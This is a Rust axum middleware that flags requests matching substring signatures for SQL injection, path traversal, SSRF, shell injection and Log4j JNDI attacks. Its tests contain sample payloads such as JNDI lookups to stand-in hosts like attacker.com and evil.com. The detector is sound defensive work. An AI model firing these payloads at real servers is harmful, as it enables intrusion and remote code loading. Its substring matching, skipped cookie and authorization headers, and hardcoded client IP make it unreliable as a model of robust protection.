use axum::{
    body::Body,
    http::{HeaderMap, Request, Response, StatusCode},
    response::IntoResponse,
};
use std::{
    future::Future,
    pin::Pin,
    task::{Context, Poll},
};
use tower::{Layer, Service};

/// RASP (Runtime Application Self-Protection) Inspector.
/// Analyzes request telemetry in zero-latency to block SQLi, Path Traversal, SSRF, RCE, and JNDI exploits.
pub struct RaspInspector;

impl RaspInspector {
    /// Deep inspection of a generic text payload for attack signatures.
    pub fn inspect_text(payload: &str) -> bool {
        let lower = payload.to_lowercase();

        // SQL Injection patterns
        if lower.contains("union select")
            || lower.contains("' or '1'='1")
            || lower.contains("; drop table")
            || lower.contains("sleep(")
            || lower.contains("benchmark(")
            || lower.contains("extractvalue(")
            || lower.contains("information_schema")
        {
            return true;
        }

        // Path Traversal patterns
        if lower.contains("../")
            || lower.contains("..\\")
            || lower.contains("/etc/passwd")
            || lower.contains("c:\\windows\\system32")
        {
            return true;
        }

        // SSRF patterns
        if lower.contains("169.254.169.254")
            || lower.contains("metadata.google.internal")
            || lower.contains("127.0.0.1:2375")
        {
            return true;
        }

        // RCE & Shell Command Injection patterns
        if lower.contains("; cat ")
            || lower.contains("| sh")
            || lower.contains("; rm -rf")
            || lower.contains("powershell")
            || lower.contains("cmd.exe")
            || lower.contains("/bin/bash")
            || lower.contains("/bin/sh")
        {
            return true;
        }

        // Log4j / JNDI Injection patterns
        if lower.contains("${jndi:")
            || lower.contains("${ldap:")
            || lower.contains("${rmi:")
            || lower.contains("${dns:")
        {
            return true;
        }

        false
    }

    /// Inspects an incoming request target URI and query string for attack patterns.
    pub fn inspect_uri(uri: &str) -> bool {
        Self::inspect_text(uri)
    }

    /// Inspects HTTP headers (User-Agent, Referer, Custom Headers) for injected attack payloads.
    pub fn inspect_headers(headers: &HeaderMap) -> bool {
        for (name, val) in headers {
            if name == "cookie" || name == "authorization" {
                continue;
            }
            if let Ok(v_str) = val.to_str() {
                if Self::inspect_text(v_str) {
                    return true;
                }
            }
        }
        false
    }
}

/// Tower Layer for RASP Runtime Application Self-Protection middleware.
#[derive(Clone, Default)]
pub struct RaspSecurityLayer;

impl<S> Layer<S> for RaspSecurityLayer {
    type Service = RaspSecurityService<S>;

    fn layer(&self, inner: S) -> Self::Service {
        RaspSecurityService { inner }
    }
}

/// Tower Service for RASP middleware.
#[derive(Clone)]
pub struct RaspSecurityService<S> {
    inner: S,
}

impl<S> Service<Request<Body>> for RaspSecurityService<S>
where
    S: Service<Request<Body>, Response = Response<Body>> + Clone + Send + 'static,
    S::Future: Send + 'static,
{
    type Response = Response<Body>;
    type Error = S::Error;
    type Future = Pin<Box<dyn Future<Output = Result<Self::Response, Self::Error>> + Send>>;

    fn poll_ready(&mut self, cx: &mut Context<'_>) -> Poll<Result<(), Self::Error>> {
        self.inner.poll_ready(cx)
    }

    fn call(&mut self, req: Request<Body>) -> Self::Future {
        let uri_str = req.uri().to_string();
        let headers_bad = RaspInspector::inspect_headers(req.headers());
        let uri_bad = RaspInspector::inspect_uri(&uri_str);

        if uri_bad || headers_bad {
            let store = crate::telemetry::SecurityStore::global();
            if let Ok(mut events) = store.live_events.lock() {
                events.insert(
                    0,
                    crate::telemetry::LiveSecurityEvent {
                        event_type: "RASP_PAYLOAD_INTERCEPTED".to_string(),
                        details: format!(
                            "Intercepted malicious payload (URI: {}, Headers Violation: {})",
                            uri_str, headers_bad
                        ),
                        client_ip: "127.0.0.1".to_string(),
                        timestamp_str: crate::telemetry::current_timestamp_str(),
                        verified_hmac: true,
                    },
                );
            }
            let res = (
                StatusCode::FORBIDDEN,
                "🛡️ RASP Security Violation: Malicious payload intercepted.",
            )
                .into_response();
            return Box::pin(async move { Ok(res) });
        }

        let mut inner = self.inner.clone();
        Box::pin(async move { inner.call(req).await })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::http::HeaderValue;

    #[test]
    fn test_rasp_sqli_detection() {
        assert!(RaspInspector::inspect_uri(
            "/api/users?q=UNION SELECT * FROM passwords"
        ));
        assert!(RaspInspector::inspect_uri("/login?user=admin' OR '1'='1"));
        assert!(RaspInspector::inspect_text("SELECT * FROM users WHERE id = 1; SLEEP(5);"));
        assert!(!RaspInspector::inspect_uri("/api/users?id=123"));
    }

    #[test]
    fn test_rasp_path_traversal_detection() {
        assert!(RaspInspector::inspect_uri(
            "/download?file=../../etc/passwd"
        ));
        assert!(!RaspInspector::inspect_uri("/download?file=document.pdf"));
    }

    #[test]
    fn test_rasp_jndi_detection() {
        assert!(RaspInspector::inspect_text("${jndi:ldap://attacker.com/exploit}"));
        assert!(RaspInspector::inspect_text("${rmi://evil.com:1099/obj}"));
    }

    #[test]
    fn test_rasp_header_inspection() {
        let mut headers = HeaderMap::new();
        headers.insert(
            "user-agent",
            HeaderValue::from_static("${jndi:ldap://evil.com/a}"),
        );
        assert!(RaspInspector::inspect_headers(&headers));

        let mut clean_headers = HeaderMap::new();
        clean_headers.insert("user-agent", HeaderValue::from_static("Mozilla/5.0"));
        assert!(!RaspInspector::inspect_headers(&clean_headers));
    }
}

#[cfg(kani)]
#[cfg_attr(mutants, mutants::skip)]
mod kani_proofs {
    use super::*;

    #[kani::proof]
    fn proof_rasp_clean_uri() {
        assert!(!RaspInspector::inspect_uri("/clean/path"));
    }
}
